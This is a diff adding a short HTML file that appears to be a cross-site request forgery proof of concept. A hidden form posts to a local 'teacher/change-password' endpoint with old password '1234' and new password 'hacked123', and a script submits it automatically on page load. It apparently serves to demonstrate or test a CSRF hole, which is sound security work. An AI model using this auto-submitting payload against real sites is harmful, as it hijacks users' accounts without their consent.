@@ -1,0 +1,12 @@
+<html>
+  <body>
+    <form action="https://127.0.0.1:5500/teacher/change-password" method="POST">
+      <input type="hidden" name="old_password" value="1234">          <!-- Require exposed credentials (Assume the old password is 1234) -->
+      <input type="hidden" name="new_password" value="hacked123">
+<!-- Change password from ‘1234’ to ‘hacked123’ -->
+    </form>
+    <script>
+      document.forms[0].submit(); <!-- Automatic Submission -->
+    </script>
+  </body>
+</html>
